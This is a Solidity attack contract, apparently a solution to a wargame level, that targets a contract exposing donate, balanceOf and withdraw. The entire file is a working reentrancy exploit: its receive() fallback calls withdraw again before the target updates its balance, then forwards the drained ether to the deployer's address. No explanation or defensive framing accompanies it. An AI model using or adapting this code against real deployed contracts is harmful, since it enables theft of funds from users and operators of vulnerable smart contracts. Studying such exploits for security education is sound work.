//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface Reentrance {
    function donate(address) external payable;
    function balanceOf(address) external view returns (uint balance);
    function withdraw(uint) external;
}

contract Enterer {
    address public immutable owner;
    Reentrance public immutable reent;

    constructor(address _target) {
        owner = msg.sender;
        reent = Reentrance(_target);
    }

    function attack() external {
        reent.withdraw(0);
    }

    receive() external payable {
        uint b = reent.balanceOf(address(this));

        console.log("Withdrawing %s", b);

        reent.withdraw(b);

        owner.call{value: b}("");
    }

}